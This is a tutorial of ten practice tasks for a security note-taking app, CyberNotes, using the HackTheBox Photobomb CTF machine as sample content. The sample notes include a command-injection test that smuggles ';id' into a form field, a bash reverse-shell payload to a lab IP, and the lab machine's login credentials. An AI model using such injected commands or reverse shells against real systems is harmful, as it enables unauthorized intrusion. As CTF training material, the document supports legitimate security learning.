# CyberNotes Practice Tasks

Complete these 10 tasks to fully understand and master the CyberNotes application.

---

## Task 1: Create Your First Project

**Objective:** Learn project management basics

**Steps:**
1. Click "Projects" in the sidebar
2. Click the "+ New Project" button
3. Fill in the details:
   - Name: `HackTheBox - Photobomb`
   - Type: Select "CTF"
   - Status: "In Progress"
   - Description: `Easy Linux machine focusing on web exploitation`
4. Click "Create Project"
5. Verify it appears in your projects list

**Success Criteria:** Project created and visible in the list

---

## Task 2: Use Quick Capture for Fast Notes

**Objective:** Learn rapid note-taking

**Steps:**
1. Click "Quick Capture" in the sidebar
2. Enter a title: `Nmap Scan Results - Photobomb`
3. Select your "HackTheBox - Photobomb" project from dropdown
4. In the content area, write:
   ```
   ## Open Ports
   - 22/tcp - SSH
   - 80/tcp - HTTP (Nginx)

   ## Observations
   - Web server redirects to photobomb.htb
   - Need to add to /etc/hosts
   ```
5. Add tags: `nmap`, `recon`, `htb`
6. Click "Save Note"

**Success Criteria:** Note saved and linked to your project

---

## Task 3: Build Your Commands Library

**Objective:** Master the one-click copy command feature

**Steps:**
1. Click "Commands" in the sidebar
2. Click "+ New Command" button
3. Add these 3 commands one by one:

**Command 1:**
- Tool: `nmap`
- Command: `nmap -sC -sV -oN scan.txt 10.10.11.182`
- Purpose: `Initial port scan with version detection`
- Tags: `recon`, `scanning`

**Command 2:**
- Tool: `gobuster`
- Command: `gobuster dir -u http://photobomb.htb -w /usr/share/wordlists/dirb/common.txt`
- Purpose: `Directory bruteforce`
- Tags: `web`, `enumeration`

**Command 3:**
- Tool: `curl`
- Command: `curl -X POST http://photobomb.htb/printer -d "photo=voight.jpg&filetype=png;id"`
- Purpose: `Command injection test`
- Tags: `exploit`, `web`

4. Click the COPY button on each command to test clipboard functionality
5. Try filtering by tool (select "nmap" from dropdown)

**Success Criteria:** 3 commands added, copy buttons work, filtering works

---

## Task 4: Explore Project Details

**Objective:** Learn project organization features

**Steps:**
1. Go to "Projects" and click on your "HackTheBox - Photobomb" project
2. Explore each tab:
   - **Notes Tab:** See your Quick Capture note here
   - **Commands Tab:** Add a project-specific command
   - **Files Tab:** Note this is for file references
   - **Timeline Tab:** See project activity
3. Click "Edit" button and update the status to "In Progress"
4. Add a new note directly from the project detail page

**Success Criteria:** Understand project tabs and how content links together

---

## Task 5: Create a Walkthrough Note

**Objective:** Learn markdown documentation

**Steps:**
1. Click "Quick Capture"
2. Create a detailed walkthrough:
   - Title: `Photobomb Complete Walkthrough`
   - Type: Select "Walkthrough"
   - Project: Link to your HTB project
   - Content (use markdown):
   ```markdown
   # Photobomb Walkthrough

   ## Reconnaissance
   Started with nmap scan revealing ports 22 and 80.

   ## Web Enumeration
   Found `/printer` endpoint requiring authentication.

   ## Initial Foothold
   Discovered credentials in JavaScript file:
   - Username: `pH0t0`
   - Password: `b0Mb!`

   ## Exploitation
   Command injection in `filetype` parameter:
   ```
   filetype=png;bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
   ```

   ## Privilege Escalation
   Found sudo permissions on `/opt/cleanup.sh`
   ```
3. Save and then go to "Walkthroughs" to see it displayed

**Success Criteria:** Walkthrough appears in Walkthroughs section with rendered markdown

---

## Task 6: Use Pre-built Templates

**Objective:** Learn template system

**Steps:**
1. Click "Templates" in the sidebar
2. Review the 3 default templates:
   - CTF Challenge Walkthrough
   - Bug Bounty Report
   - Malware Analysis Report
3. Click "Use Template" on "CTF Challenge Walkthrough"
4. This creates a new note pre-filled with the template structure
5. Customize it for a different machine (real or imaginary)

**Success Criteria:** Created a note from template and customized it

---

## Task 7: Work with Checklists

**Objective:** Learn methodology tracking

**Steps:**
1. Click "Checklists" in the sidebar
2. Open "Web Application Testing Checklist"
3. Work through and check off items as if you were testing:
   - Check some items under "Information Gathering"
   - Check some items under "Authentication Testing"
4. Watch the progress percentage update
5. Open "Linux Privilege Escalation Checklist"
6. Check off some privesc techniques you'd typically try

**Success Criteria:** Understand how checklists track your methodology progress

---

## Task 8: Add Learning Resources

**Objective:** Learn resource management

**Steps:**
1. Click "Resources" in the sidebar
2. Click "+ New Resource"
3. Add these resources:

**Resource 1 - Course:**
- Title: `TCM Security - Practical Ethical Hacking`
- Type: Course
- URL: `https://academy.tcm-sec.com/`
- Progress: 45%
- Tags: `training`, `beginner`

**Resource 2 - Tool:**
- Title: `Burp Suite`
- Type: Tool
- URL: `https://portswigger.net/burp`
- Notes: `Web proxy for intercepting requests`
- Tags: `web`, `proxy`

**Resource 3 - Writeup:**
- Title: `IppSec - Photobomb Walkthrough`
- Type: Writeup
- URL: `https://www.youtube.com/watch?v=example`
- Tags: `htb`, `video`

4. Filter resources by type to see only "Courses"

**Success Criteria:** 3 different resource types added and filterable

---

## Task 9: Master Search and Tags

**Objective:** Learn organization and search

**Steps:**
1. Click "Search" in the sidebar (or use keyboard shortcut)
2. Search for `nmap` - see results from notes and commands
3. Search for `photobomb` - see all related content
4. Click "Tags" in the sidebar
5. See all your tags and their usage counts
6. Click on a tag to filter content by that tag
7. Notice how tags connect different content types

**Success Criteria:** Can search across all content and navigate via tags

---

## Task 10: Backup and Restore

**Objective:** Learn data management

**Steps:**
1. Click "Settings" in the sidebar
2. Review your storage statistics
3. Click "Export All Data"
4. Save the JSON backup file to your computer
5. Open the JSON file in a text editor - examine the structure
6. See how all your:
   - Projects
   - Notes
   - Commands
   - Resources
   - Are preserved in the backup
7. (Optional) Test import by clearing data and re-importing

**Warning:** Only clear data if you want to test - it will delete everything!

**Success Criteria:** Successfully exported a backup and understand the data structure

---

## Bonus Challenges

After completing all 10 tasks, try these advanced challenges:

### Bonus 1: Create a Bug Bounty Project
Set up a complete bug bounty workflow with:
- Project for a specific program
- Recon commands
- Vulnerability notes
- Report template

### Bonus 2: Build a Personal Playbook
Create a commands library with 20+ commands covering:
- Reconnaissance (nmap, masscan, amass)
- Web testing (ffuf, gobuster, nikto)
- Exploitation (sqlmap, hydra)
- Post-exploitation (linpeas, winpeas)

### Bonus 3: Document a Real Machine
Complete an actual HTB/THM machine and document:
- Every step in notes
- All commands used
- Full walkthrough
- Timeline of your process

---

## Completion Checklist

- [ ] Task 1: Created first project
- [ ] Task 2: Used Quick Capture
- [ ] Task 3: Built commands library (3 commands)
- [ ] Task 4: Explored project details
- [ ] Task 5: Created walkthrough with markdown
- [ ] Task 6: Used a template
- [ ] Task 7: Worked with checklists
- [ ] Task 8: Added learning resources
- [ ] Task 9: Mastered search and tags
- [ ] Task 10: Exported backup

**Congratulations!** Once you complete all tasks, you'll have a full understanding of CyberNotes and be ready to use it for real security work!

---

## Quick Reference

| Feature | Shortcut/Access |
|---------|-----------------|
| Quick Capture | Sidebar or Ctrl+N |
| Search | Sidebar or Ctrl+K |
| Dashboard | Home icon |
| Copy Command | Click copy button |
| Export Data | Settings > Export |

Happy Hacking!
